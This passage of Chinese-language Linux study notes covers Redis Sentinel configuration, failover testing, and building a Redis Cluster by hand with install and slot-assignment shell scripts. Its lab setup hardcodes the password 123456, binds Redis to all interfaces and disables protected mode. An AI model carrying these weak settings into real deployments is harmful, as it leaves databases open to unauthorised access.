# with ACLs. The ACL Log is useful to troubleshoot failed commands blocked 
# by ACLs. The ACL Log is stored in memory. You can reclaim memory with 
# ACL LOG RESET. Define the maximum entry length of the ACL Log below.
acllog-max-len 128

# Using an external ACL file
#
# Instead of configuring users here in this file, it is possible to use
# a stand-alone file just listing users. The two methods cannot be mixed:
# if you configure users here and at the same time you activate the external
# ACL file, the server will refuse to start.
#
# The format of the external ACL user file is exactly the same as the
# format that is used inside redis.conf to describe users.
#
# aclfile /etc/redis/sentinel-users.acl

# requirepass <password>
#
# You can configure Sentinel itself to require a password, however when doing
# so Sentinel will try to authenticate with the same password to all the
# other Sentinels. So you need to configure all your Sentinels in a given
# group with the same "requirepass" password. Check the following documentation
# for more info: https://redis.io/topics/sentinel
#
# IMPORTANT NOTE: starting with Redis 6.2 "requirepass" is a compatibility
# layer on top of the ACL system. The option effect will be just setting
# the password for the default user. Clients will still authenticate using
# AUTH <password> as usually, or more explicitly with AUTH default <password>
# if they follow the new protocol: both will work.
#
# New config files are advised to use separate authentication control for
# incoming connections (via ACL), and for outgoing connections (via
# sentinel-user and sentinel-pass) 
#
# The requirepass is not compatable with aclfile option and the ACL LOAD
# command, these will cause requirepass to be ignored.

# sentinel sentinel-user <username>
#
# You can configure Sentinel to authenticate with other Sentinels with specific
# user name. 

# sentinel sentinel-pass <password>
#
# The password for Sentinel to authenticate with other Sentinels. If sentinel-user
# is not configured, Sentinel will use 'default' user with sentinel-pass to authenticate.

# sentinel parallel-syncs <master-name> <numreplicas>
#
# How many replicas we can reconfigure to point to the new replica simultaneously
# during the failover. Use a low number if you use the replicas to serve query
# to avoid that all the replicas will be unreachable at about the same
# time while performing the synchronization with the master.
sentinel parallel-syncs mymaster 1

# sentinel failover-timeout <master-name> <milliseconds>
#
# Specifies the failover timeout in milliseconds. It is used in many ways:
#
# - The time needed to re-start a failover after a previous failover was
#   already tried against the same master by a given Sentinel, is two
#   times the failover timeout.
#
# - The time needed for a replica replicating to a wrong master according
#   to a Sentinel current configuration, to be forced to replicate
#   with the right master, is exactly the failover timeout (counting since
#   the moment a Sentinel detected the misconfiguration).
#
# - The time needed to cancel a failover that is already in progress but
#   did not produced any configuration change (SLAVEOF NO ONE yet not
#   acknowledged by the promoted replica).
#
# - The maximum time a failover in progress waits for all the replicas to be
#   reconfigured as replicas of the new master. However even after this time
#   the replicas will be reconfigured by the Sentinels anyway, but not with
#   the exact parallel-syncs progression as specified.
#
# Default is 3 minutes.
sentinel failover-timeout mymaster 180000

# SCRIPTS EXECUTION
#
# sentinel notification-script and sentinel reconfig-script are used in order
# to configure scripts that are called to notify the system administrator
# or to reconfigure clients after a failover. The scripts are executed
# with the following rules for error handling:
#
# If script exits with "1" the execution is retried later (up to a maximum
# number of times currently set to 10).
#
# If script exits with "2" (or an higher value) the script execution is
# not retried.
#
# If script terminates because it receives a signal the behavior is the same
# as exit code 1.
#
# A script has a maximum running time of 60 seconds. After this limit is
# reached the script is terminated with a SIGKILL and the execution retried.

# NOTIFICATION SCRIPT
#
# sentinel notification-script <master-name> <script-path>
# 
# Call the specified notification script for any sentinel event that is
# generated in the WARNING level (for instance -sdown, -odown, and so forth).
# This script should notify the system administrator via email, SMS, or any
# other messaging system, that there is something wrong with the monitored
# Redis systems.
#
# The script is called with just two arguments: the first is the event type
# and the second the event description.
#
# The script must exist and be executable in order for sentinel to start if
# this option is provided.
#
# Example:
#
# sentinel notification-script mymaster /var/redis/notify.sh

# CLIENTS RECONFIGURATION SCRIPT
#
# sentinel client-reconfig-script <master-name> <script-path>
#
# When the master changed because of a failover a script can be called in
# order to perform application-specific tasks to notify the clients that the
# configuration has changed and the master is at a different address.
# 
# The following arguments are passed to the script:
#
# <master-name> <role> <state> <from-ip> <from-port> <to-ip> <to-port>
#
# <state> is currently always "failover"
# <role> is either "leader" or "observer"
# 
# The arguments from-ip, from-port, to-ip, to-port are used to communicate
# the old address of the master and the new address of the elected replica
# (now a master).
#
# This script should be resistant to multiple invocations.
#
# Example:
#
# sentinel client-reconfig-script mymaster /var/redis/reconfig.sh

# SECURITY
#
# By default SENTINEL SET will not be able to change the notification-script
# and client-reconfig-script at runtime. This avoids a trivial security issue
# where clients can set the script to anything and trigger a failover in order
# to get the program executed.

sentinel deny-scripts-reconfig yes

# REDIS COMMANDS RENAMING
#
# Sometimes the Redis server has certain commands, that are needed for Sentinel
# to work correctly, renamed to unguessable strings. This is often the case
# of CONFIG and SLAVEOF in the context of providers that provide Redis as
# a service, and don't want the customers to reconfigure the instances outside
# of the administration console.
#
# In such case it is possible to tell Sentinel to use different command names
# instead of the normal ones. For example if the master "mymaster", and the
# associated replicas, have "CONFIG" all renamed to "GUESSME", I could use:
#
# SENTINEL rename-command mymaster CONFIG GUESSME
#
# After such configuration is set, every time Sentinel would use CONFIG it will
# use GUESSME instead. Note that there is no actual need to respect the command
# case, so writing "config guessme" is the same in the example above.
#
# SENTINEL SET can also be used in order to perform this configuration at runtime.
#
# In order to set a command back to its original name (undo the renaming), it
# is possible to just rename a command to itself:
#
# SENTINEL rename-command mymaster CONFIG CONFIG

# HOSTNAMES SUPPORT
#
# Normally Sentinel uses only IP addresses and requires SENTINEL MONITOR
# to specify an IP address. Also, it requires the Redis replica-announce-ip
# keyword to specify only IP addresses.
#
# You may enable hostnames support by enabling resolve-hostnames. Note
# that you must make sure your DNS is configured properly and that DNS
# resolution does not introduce very long delays.
#
SENTINEL resolve-hostnames no

# When resolve-hostnames is enabled, Sentinel still uses IP addresses
# when exposing instances to users, configuration files, etc. If you want
# to retain the hostnames when announced, enable announce-hostnames below.
#
SENTINEL announce-hostnames no
```

**哨兵的配置文件介绍**

```
#如果是编译安装，在源码目录有sentinel.conf，复制到安装目录即可，
如:/apps/redis/etc/sentinel.conf
[root@centos8 ~]#vim /etc/redis-sentinel.conf 
bind 0.0.0.0
port 26379
daemonize yes
pidfile "redis-sentinel.pid"
logfile "sentinel_26379.log"
dir "/tmp"  #工作目录

sentinel monitor mymaster 10.0.0.8 6379 2 #指定当前mymaster集群中master服务器的地址和端口
#2为法定人数限制(quorum)，即有几个sentinel认为master down了就进行故障转移，一般此值是所有sentinel节点(一般总数是>=3的 奇数,如:3,5,7等)的一半以上的整数值，比如，总数是3，即3/2=1.5，取整为2,是master的ODOWN客观下线的依据。


sentinel auth-pass mymaster 123456 #mymaster集群中master的密码，注意此行要在上面行的下面。


sentinel down-after-milliseconds mymaster 30000 #(SDOWN)判断mymaster集群中所有节点的主观下线的时间，单位：毫秒，建议3000。

sentinel parallel-syncs mymaster 1 #发生故障转移后，同时向新master同步数据的slave数量，数字越小总同步时间越长，但可以减轻新master的负载压力。

sentinel failover-timeout mymaster 180000 #所有slaves指向新的master所需的超时时间，单位：毫秒。

sentinel deny-scripts-reconfig yes #禁止修改脚本

logfile /var/log/redis/sentinel.log
```

**三个哨兵服务器的配置都如下**

```
#三个服务器的哨兵配置如下
[root@redis-slave1 ~]# grep -vE "^#|^$" /apps/redis/etc/redis-sentinel.conf
bind 0.0.0.0
port 26379
daemonize yes
pidfile /apps/redis/run/redis-sentinel.pid
logfile "/apps/redis/log/sentinel_26379.log"
dir /tmp
sentinel monitor mymaster 10.0.0.17 6379 2
sentinel auth-pass mymaster 123456
sentinel down-after-milliseconds mymaster 1000
acllog-max-len 128
sentinel parallel-syncs mymaster 1
sentinel failover-timeout mymaster 180000
sentinel deny-scripts-reconfig yes
SENTINEL resolve-hostnames no
SENTINEL announce-hostnames no


#以下内容自动生成，不需要修改
sentinel myid 50547f34ed71fd48c197924969937e738a39975b  #此行自动生成必须唯一,修改此值需重启redis和sentinel服务
.....
# Generated by CONFIG REWRITE
protected-mode no
supervised systemd
sentinel leader-epoch mymaster 0
sentinel known-replica mymaster 10.0.0.17 6379
sentinel known-replica mymaster 10.0.0.27 6379
sentinel current-epoch 0
```

**需修改配置文件汇总**

```
#1.编辑哨兵的配置文件
#主从节点都需要配置
[root@redis-master ~]# scp /apps/redis/etc/redis-sentinel.conf 10.0.0.27:/apps/redis/etc/
[root@redis-master ~]# scp /apps/redis/etc/redis-sentinel.conf 10.0.0.37:/apps/redis/etc/
[root@redis-master etc]# chown -R redis.redis /apps/redis/



#2.准备哨兵启动文件
#主从节点都需要配置
[root@redis-master ~]# vim /lib/systemd/system/redis-sentinel.service
[Unit]
Description=Redis Sentinel
After=network.target

[Service]
ExecStart=/apps/redis/bin/redis-sentinel /apps/redis/etc/redis-sentinel.conf --supervised systemd
ExecStop=/bin/kill -s QUIT $MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
[root@redis-master etc]# systemctl daemon-reload
[root@redis-master etc]# systemctl start redis-sentinel
[root@redis-master etc]# systemctl status redis-sentinel
● redis-sentinel.service - Redis Sentinel
   Loaded: loaded (/usr/lib/systemd/system/redis-sentinel.service; enabled; vendor preset: disabled)
   Active: active (running) since Mon 2022-07-18 17:01:37 CST; 2s ago
 Main PID: 18081 (redis-sentinel)
   Status: "Ready to accept connections"
   CGroup: /system.slice/redis-sentinel.service
           └─18081 /apps/redis/bin/redis-sentinel 0.0.0.0:26379 [sentinel]

Jul 18 17:01:37 redis-master systemd[1]: Starting Redis Sentinel...
Jul 18 17:01:37 redis-master systemd[1]: Started Redis Sentinel.
```

 **验证哨兵端口**

```
[root@redis-master ~]#ss -ntl
#开启了一个26379端口表示成功！！！
State       Recv-Q       Send-Q     Local Address:Port     Peer Address:Port 
       
LISTEN       0             128               0.0.0.0:22            0.0.0.0:*     
      
LISTEN       0             128               0.0.0.0:26379         0.0.0.0:*     
      
LISTEN       0             128               0.0.0.0:6379          0.0.0.0:*     
      
LISTEN       0             128                 [::]:22               [::]:*     
      
LISTEN       0             128                 [::]:26379           [::]:*     
      
LISTEN       0             128                 [::]:6379             [::]:*
```

**停止Redis Master测试故障转移**

**主master节点**

```
#1.直接停掉服务
[root@redis-master etc]# systemctl stop redis



#2.查看日志
[root@redis-master etc]# tail -f  /apps/redis/log/sentinel_26379.log 
22532:X 18 Jul 2022 18:42:50.422 # +sdown master mymaster 10.0.0.17 6379
22532:X 18 Jul 2022 18:42:50.494 # +new-epoch 1
22532:X 18 Jul 2022 18:42:50.495 # +vote-for-leader 285def35db7d06c7e05bab8350f34991c5d3e9ca 1
22532:X 18 Jul 2022 18:42:50.512 # +odown master mymaster 10.0.0.17 6379 #quorum 2/2
22532:X 18 Jul 2022 18:42:50.513 # Next failover delay: I will not start a failover before Mon Jul 18 18:48:50 2022
22532:X 18 Jul 2022 18:42:51.592 # +config-update-from sentinel 285def35db7d06c7e05bab8350f34991c5d3e9ca 10.0.0.27 26379 @ mymaster 10.0.0.17 6379
22532:X 18 Jul 2022 18:42:51.592 # +switch-master mymaster 10.0.0.17 6379 10.0.0.37 6379  #已经自动实现故障转移了
22532:X 18 Jul 2022 18:42:51.592 * +slave slave 10.0.0.27:6379 10.0.0.27 6379 @ mymaster 10.0.0.37 6379
22532:X 18 Jul 2022 18:42:51.592 * +slave slave 10.0.0.17:6379 10.0.0.17 6379 @ mymaster 10.0.0.37 6379
22532:X 18 Jul 2022 18:42:52.624 # +sdown slave 10.0.0.17:6379 10.0.0.17 6379 @ mymaster 10.0.0.37 6379
```

**配置slave1**

```
127.0.0.1:6379> INFO REPLICATION
# Replication
role:slave
master_host:10.0.0.37    #自动指向新主
master_port:6379
master_link_status:up
master_last_io_seconds_ago:1
master_sync_in_progress:0
slave_repl_offset:814559
slave_priority:100
slave_read_only:1
replica_announced:1
connected_slaves:0
master_failover_state:no-failover
master_replid:4367a90c6e4495047e82f2eaedf29e5e380824ae
master_replid2:937f447da4e9fb06fe5e7af5b7dc1dbbec9d857c
master_repl_offset:814559
second_repl_offset:614687
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:814559
```

**配置slave2**

```
#1.查看故障后的日志文件
[root@redis-slave2 etc]# tail -f /apps/redis/log/sentinel_26379.log 
17279:X 18 Jul 2022 18:42:50.414 # +sdown master mymaster 10.0.0.17 6379
17279:X 18 Jul 2022 18:42:50.492 # +new-epoch 1
17279:X 18 Jul 2022 18:42:50.493 # +vote-for-leader 285def35db7d06c7e05bab8350f34991c5d3e9ca 1
17279:X 18 Jul 2022 18:42:51.482 # +odown master mymaster 10.0.0.17 6379 #quorum 3/2
17279:X 18 Jul 2022 18:42:51.482 # Next failover delay: I will not start a failover before Mon Jul 18 18:48:51 2022
17279:X 18 Jul 2022 18:42:51.591 # +config-update-from sentinel 285def35db7d06c7e05bab8350f34991c5d3e9ca 10.0.0.27 26379 @ mymaster 10.0.0.17 6379
17279:X 18 Jul 2022 18:42:51.591 # +switch-master mymaster 10.0.0.17 6379 10.0.0.37 6379
17279:X 18 Jul 2022 18:42:51.591 * +slave slave 10.0.0.27:6379 10.0.0.27 6379 @ mymaster 10.0.0.37 6379
17279:X 18 Jul 2022 18:42:51.592 * +slave slave 10.0.0.17:6379 10.0.0.17 6379 @ mymaster 10.0.0.37 6379
17279:X 18 Jul 2022 18:42:52.598 # +sdown slave 10.0.0.17:6379 10.0.0.17 6379 @ mymaster 10.0.0.37 6379



#2.查看故障后的新主
127.0.0.1:6379> INFO REPLICATION
# Replication
role:master   #变成新主
connected_slaves:1
slave0:ip=10.0.0.27,port=6379,state=online,offset=797276,lag=0
master_failover_state:no-failover
master_replid:4367a90c6e4495047e82f2eaedf29e5e380824ae
master_replid2:937f447da4e9fb06fe5e7af5b7dc1dbbec9d857c
master_repl_offset:797276
second_repl_offset:614687
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:797276





#3.查看哨兵信息
[root@redis-slave2 etc]# redis-cli -p 26379
127.0.0.1:26379> INFO sentinel
# Sentinel
sentinel_masters:1
sentinel_tilt:0
sentinel_running_scripts:0
sentinel_scripts_queue_length:0
sentinel_simulate_failure_flags:0
master0:name=mymaster,status=ok,address=10.0.0.37:6379,slaves=2,sentinels=3  #两个slave,三个sentinel服务器,如果sentinels值不符合,检查myid可能冲突。
```

##### 45.4.6.3 sentinel运维

**手动让主节点下线**

```
#1.手动让主节点下线
sentinel failover <masterName>

[root@redis-slave2 etc]# redis-cli -p 26379
sentinel failover mymaster
OK


#2.设置优先级
[root@centos8 ~]#vim /apps/redis/etc/redis.conf
replica-priority 10  #指定优先级,值越小sentinel会优先将之选为新的master,默为值为100
```

##### 45.4.6.4 应用程序如何连接redis

**客户端连接sentinel工作原理**

```
1.客户端获取sentinel节点集合，选举出一个sentinel。
```

![1658150380570](linux体系.assets/1658150380570.png)



```
2.由这个sentinel 通过masterName 获取master节点信息，客户端通过sentinel get-master-addr-by-name master-name这个api获取对应的主节点信息
```

![1658150992239](linux体系.assets/1658150992239.png)

```
3.sentinel发送role指令确认mater的信息，验证当前获取的"主节点"是真正的主节点，这样的目的是为了防止故障转移期间主节点的变化。
```

![1658151111773](linux体系.assets/1658151111773.png)

```
4. 客户端保持和sentinel节点集合的联系,即订阅sentinel节点相关频道，时刻获取主节点的相关信息，获取新的master信息变化,并自动连接新的master。
```

![1658151508408](linux体系.assets/1658151508408.png)

**java 连接Sentinel哨兵**

java 客户端连接Redis：https://github.com/xetorthio/jedis/blob/master/pom.xml

```
#jedis/pom.xml 配置连接redis
<properties>
      <redis- hosts>localhost:6379,localhost:6380,localhost:6381,localhost:6382,localhost:6383
,localhost:6384,localhost:6385</redis-hosts>
      <sentinel- hosts>localhost:26379,localhost:26380,localhost:26381</sentinel-hosts>
      <cluster- hosts>localhost:7379,localhost:7380,localhost:7381,localhost:7382,localhost:7383
,localhost:7384,localhost:7385</cluster-hosts>
      <github.global.server>github</github.global.server>
</properties>
```

```
java客户端连接单机的redis是通过Jedis来实现的，java代码用的时候只要创建Jedis对象就可以建多个Jedis连接池来连接redis，应用程序再直接调用连接池即可连接Redis。而Redis为了保障高可用,服务一般都是Sentinel部署方式，当Redis服务中的主服务挂掉之后,会仲裁出另外一台Slaves服务充当Master。这个时候,我们的应用即使使用了Jedis 连接池,如果Master服务挂了,应用将还是无法连接新的Master服务，为了解决这个问题, Jedis也提供了相应的Sentinel实现,能够在Redis Sentinel主从切换时候,通知应用,把应用连接到新的Master服务。


Redis Sentinel的使用也是十分简单的,只是在JedisPool中添加了Sentinel和MasterName参数，JRedis Sentinel底层基于Redis订阅实现Redis主从服务的切换通知，当Reids发生主从切换时，Sentinel会发送通知主动通知Jedis进行连接的切换，JedisSentinelPool在每次从连接池中获取链接对象的时候,都要对连接对象进行检测,如果此链接和Sentinel的Master服务连接参数不一致,则会关闭此连接,重新获取新的Jedis连接对象。
```

#### 45.4.7 Redis Cluster

##### 45.4.7.1 Redis Cluster工作原理

```
Redis Cluster特点如下：
1. 所有Redis节点使用(PING机制)互联。
2. 集群中某个节点的是否失效，是由整个集群中超过半数的节点监测都失效，才能算真正的失效。
3. 客户端不需要proxy即可直接连接redis，应用程序中需要配置有全部的redis服务器IP。
4. redis cluster把所有的redis node 平均映射到 0-16383个槽位(slot)上，读写需要到指定的redis node上进行操作，因此有多少个redis node相当于redis并发扩展了多少倍，每个redis node承担16384/N个槽位。
5. Redis cluster预先分配16384个(slot)槽位，当需要在redis集群中写入一个key -value的时候，会使用CRC16(key) mod 16384之后的值，决定将key写入值哪一个槽位从而决定写入哪一个Redis节点上，从而有效解决单机瓶颈。
```

![1658202851510](linux体系.assets/1658202851510.png)

**工作原理**

![1658203898966](linux体系.assets/1658203898966.png)

##### 45.4.7.2 Redis Cluster部署方式

```
原生命令安装
理解Redis Cluster架构
生产环境不使用

官方工具安装
高效、准确
生产环境可以使用

自主研发
可以实现可视化的自动化部署
```

##### 45.4.7.3 实现原生命令部署

![1658221667395](linux体系.assets/1658221667395.png)

**环境准备**

```
#集群节点
10.0.0.7 
10.0.0.17
10.0.0.27
10.0.0.37
10.0.0.47 
10.0.0.57
#预留服务器扩展使用
10.0.0.67 
10.0.0.77
```

**原生命令手动部署过程**

```
1）在所有节点安装redis,并配置开启cluster功能。
2）各个节点执行meet,实现所有节点的相互通信。
3）为各个master节点指派槽位范围。
4）指定各个节点的主从关系。
```

**多窗口操作xhsell**

![1658303804704](linux体系.assets/1658303804704.png)

![1658303835454](linux体系.assets/1658303835454.png)

**所有的节点安装redis脚本**

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_redis.sh
#Description：  通用脚本：在线一键编译安装Redis
#********************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

#URL='https://download.redis.io/releases/'
URL='http://liusenbiao.cn/download/tars/redis/'
REDIS_FILE=redis-6.2.2.tar.gz
VERSION=`echo $REDIS_FILE |awk -F"[-.]" '{print $2}'`
PASSWORD=123456
INSTALL_DIR=/apps/redis

rpm -q wget &> /dev/null || yum -y install wget
os(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release;then
        rpm -q redhat-lsb-core &> /dev/null || { ${COLOR}"安装lsb_release工具"${END};yum -y install  redhat-lsb-core &> /dev/null; }
    fi
    OS_ID=`lsb_release -is`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${REDIS_FILE} ];then
        ${COLOR}"缺少${REDIS_FILE}文件"${END}
        ${COLOR}'开始下载REDIS源码包'${END}
        wget ${URL}${REDIS_FILE} || { ${COLOR}"Redis 源码下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){
    [ -d ${INSTALL_DIR} ] && { ${COLOR}"Redis已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装REDIS"${END}
    ${COLOR}"开始安装REDIS依赖包"${END}
    if [ ${VERSION} == "6" ] ;then
        if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel systemd-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev libsystemd-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    else
         if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    fi
    cd ${SRC_DIR}
    tar xf ${REDIS_FILE}
    REDIS_DIR=`echo ${REDIS_FILE} | sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${REDIS_DIR}
    if [ ${VERSION} == "6" ] ;then
        make -j ${CPUS} USE_SYSTEMD=yes PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    else
        make -j ${CPUS} PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    fi
    ln -s ${INSTALL_DIR}/bin/redis-*  /usr/bin/
    mkdir -p ${INSTALL_DIR}/{etc,log,data,run}
    cp redis.conf  ${INSTALL_DIR}/etc/
    sed -i -e 's/bind 127.0.0.1.*/bind 0.0.0.0/'  -e "/# requirepass/a requirepass ${PASSWORD}"  -e "/^dir .*/c dir ${INSTALL_DIR}/data/"  -e "/logfile .*/c logfile ${INSTALL_DIR}/log/redis-6379.log"  -e  "/^pidfile .*/c  pidfile ${INSTALL_DIR}/run/redis_6379.pid" ${INSTALL_DIR}/etc/redis.conf

    if id redis &> /dev/null ;then
        ${COLOR}"Redis 用户已存在"${END}
    else
        useradd -r -s /sbin/nologin redis
        ${COLOR}"Redis 用户创建成功"${END}
    fi

    chown -R redis.redis ${INSTALL_DIR}
    cat >> /etc/sysctl.conf <<-EOF
net.core.somaxconn = 1024
vm.overcommit_memory = 1
EOF
    sysctl -p
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.d/rc.local
        chmod +x /etc/rc.d/rc.local
    else
        cat >> /lib/systemd/system/rc-local.service <<-EOF

[Install]
WantedBy=multi-user.target
EOF
        echo '#!/bin/bash' > /etc/rc.local
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    cat > /lib/systemd/system/redis.service <<-EOF
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=${INSTALL_DIR}/bin/redis-server ${INSTALL_DIR}/etc/redis.conf --supervised systemd
ExecReload=/bin/kill -s HUP \$MAINPID
ExecStop=/bin/kill -s QUIT \$MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now  redis &> /dev/null 
    systemctl is-active redis &> /dev/null && ${COLOR}"Redis 服务启动成功,Redis信息如下:"${END} || { ${COLOR}"Redis 启动失败"${END};exit; }
    redis-cli -a ${PASSWORD} info server 2> /dev/null
    ${COLOR}"亲亲~Redis安装完成"${END}
}

main(){
    os
    check_file
    install
}

main
```

**在所有节点启动cluster功能**

```
#1.手动修改配置文件
[root@node1 ~]# vim /apps/redis/etc/redis.conf
bind 0.0.0.0
masterauth 123456
requirepass 123456
cluster-enabled yes #取消此行注释，必须开启集群，开启后redis，进程会有cluster标识
cluster-config-file nodes-6379.conf #取消此行注释，此为集群状态文件记录主从关系以及slot范围信息,由redis cluster集群自动创建和维护
cluster-require-full-coverage no #默认为yes,设为no可以防止一个节点不可用导致整个cluster不可用。



#2.非交互
[root@node1 ~]# sed -i.bak -e 's/bind 127.0.0.1/bind 0.0.0.0/' -e '/masterauth/a masterauth 123456' -e '/# cluster-enabled yes/a cluster-enabled yes' -e '/# cluster-config-file nodes-6379.conf/a cluster-config-file nodes-6379.conf' -e '/cluster-require-full-coverage yes/c cluster-require-full-coverage no' /apps/redis/etc/redis.conf 



#3.重启服务
[root@node1 ~]# systemctl restart redis
[root@node1 ~]# ps aux |grep redis
redis     16130  0.1  0.2 195544 10868 ?        Ssl  15:54   0:00 /apps/redis/bin/redis-server 0.0.0.0:6379 [cluster]   #工作在集群模式下了
root      16139  0.0  0.0 112808   968 pts/0    R+   15:58   0:00 grep --color=auto redis
```

**执行meet 操作实现相互通信**

```
#1.在任一节点上和其它所有节点进行meet通信
[root@node1 ~]# redis-cli -a 123456 cluster nodes; redis-cli -a 123456 --no-auth-warning cluster meet 10.0.0.17 6379
[root@node1 ~]# redis-cli -a 123456 cluster nodes; redis-cli -a 123456 --no-auth-warning cluster meet 10.0.0.27 6379
[root@node1 ~]# redis-cli -a 123456 cluster nodes; redis-cli -a 123456 --no-auth-warning cluster meet 10.0.0.37 6379
[root@node1 ~]# redis-cli -a 123456 cluster nodes; redis-cli -a 123456 --no-auth-warning cluster meet 10.0.0.47 6379
[root@node1 ~]# redis-cli -a 123456 cluster nodes; redis-cli -a 123456 --no-auth-warning cluster meet 10.0.0.57 6379






#2.查看当前状态
[root@node1 ~]# redis-cli -a 123456 cluster nodes
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
9f613076cc48a00404be4283ca989b5ac957f95a 10.0.0.7:6379@16379 myself,master - 0 1658305038000 5 connected
91a409be382d26737706c53a6b6193420547c096 10.0.0.27:6379@16379 master - 0 1658305039567 2 connected
d235904d8b6b3a354537b93716f9eb0b10f6f443 10.0.0.57:6379@16379 master - 0 1658305037000 0 connected
0b128167e7a2d44b1e68da3bd4f4bd04f1de1e17 10.0.0.37:6379@16379 master - 0 1658305037503 3 connected
7268ef8db83935fe1088fe50791710ba73b3fc34 10.0.0.47:6379@16379 master - 0 1658305039000 4 connected
4093f85f0fb3dc140a7b6abe27c40d0ce4eab0dc 10.0.0.17:6379@16379 master - 0 1658305040572 1 connected



[root@node1 ~]# redis-cli -a 123456 cluster info
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
cluster_state:fail
cluster_slots_assigned:0
cluster_slots_ok:0
cluster_slots_pfail:0
cluster_slots_fail:0
cluster_known_nodes:6  #6个节点！！
cluster_size:0
cluster_current_epoch:5
cluster_my_epoch:5
cluster_stats_messages_ping_sent:396
cluster_stats_messages_pong_sent:385
cluster_stats_messages_meet_sent:5
cluster_stats_messages_sent:786
cluster_stats_messages_ping_received:385
cluster_stats_messages_pong_received:401
cluster_stats_messages_received:786
```

**为各个master节点指派槽位范围**

```
#1.编写分配槽位的脚本
#!/bin/bash
#
#********************************************************************
#Author:        liusenbiao
#QQ:            29308620
#Date:          2022-07-20
#FileName：     addslot.sh
#URL:           http://www.liusenbiao.com
#Description：  分配槽位脚本
#********************************************************************
host=$1
port=$2
start=$3
end=$4
pass=123456

for slot in `seq ${start} ${end}`;do
    echo slot:$slot
    redis-cli -h ${host} -p $port -a ${pass} --no-auth-warning  cluster addslots ${slot} 
done
[root@node1 ~]# chmod +x addslot.sh





#2.为三个master分配槽位,共16364/3=5,461.333333333333,平均每个master分配5,461个槽位
[root@centos8 ~]#bash addslot.sh 10.0.0.7 6379 0 5461
[root@centos8 ~]#bash addslot.sh 10.0.0.17 6379 5462 10922
[root@centos8 ~]#bash addslot.sh 10.0.0.27 6379 10923 16383





#3.查看槽位分配情况
[root@node1 ~]# redis-cli -a 123456 cluster nodes
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
9f613076cc48a00404be4283ca989b5ac957f95a 10.0.0.7:6379@16379 myself,master - 0 1658306789000 5 connected 0-5461   #分配成功！
91a409be382d26737706c53a6b6193420547c096 10.0.0.27:6379@16379 master - 0 1658306792000 2 connected 10923-16383    #分配成功！
d235904d8b6b3a354537b93716f9eb0b10f6f443 10.0.0.57:6379@16379 master - 0 1658306792099 0 connected
0b128167e7a2d44b1e68da3bd4f4bd04f1de1e17 10.0.0.37:6379@16379 master - 0 1658306793106 3 connected
7268ef8db83935fe1088fe50791710ba73b3fc34 10.0.0.47:6379@16379 master - 0 1658306791000 4 connected
4093f85f0fb3dc140a7b6abe27c40d0ce4eab0dc 10.0.0.17:6379@16379 master - 0 1658306791091 1 connected 5462-10922  #分配成功！
```

**指定各个节点的主从关系**

```
#1.#通过上面cluster nodes 查看master的ID信息,执行下面操作,将对应的slave指定相应的master节点,实现三对主从节点
[root@node1 ~]# redis-cli -h 10.0.0.37 -a 123456 --no-auth-warning cluster replicate 9f613076cc48a00404be4283ca989b5ac957f95a
OK   #10.0.0.7主，10.0.0.37是从
[root@node1 ~]# redis-cli -h 10.0.0.47 -a 123456 --no-auth-warning cluster replicate 4093f85f0fb3dc140a7b6abe27c40d0ce4eab0dc
OK    #10.0.0.17主，10.0.0.47是从
[root@node1 ~]# redis-cli -h 10.0.0.57 -a 123456 --no-auth-warning cluster replicate 91a409be382d26737706c53a6b6193420547c096
OK    #10.0.0.27主，10.0.0.57是从






#2.查看集群状态
[root@node1 ~]# redis-cli -a 123456 cluster info
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
cluster_state:ok
cluster_slots_assigned:16384
cluster_slots_ok:16384
cluster_slots_pfail:0
cluster_slots_fail:0
cluster_known_nodes:6
cluster_size:3   #3组主从集群搭建完毕
cluster_current_epoch:5
cluster_my_epoch:5
cluster_stats_messages_ping_sent:2974
cluster_stats_messages_pong_sent:2812
cluster_stats_messages_meet_sent:5
cluster_stats_messages_sent:5791
cluster_stats_messages_ping_received:2812
cluster_stats_messages_pong_received:2979
cluster_stats_messages_received:5791
```

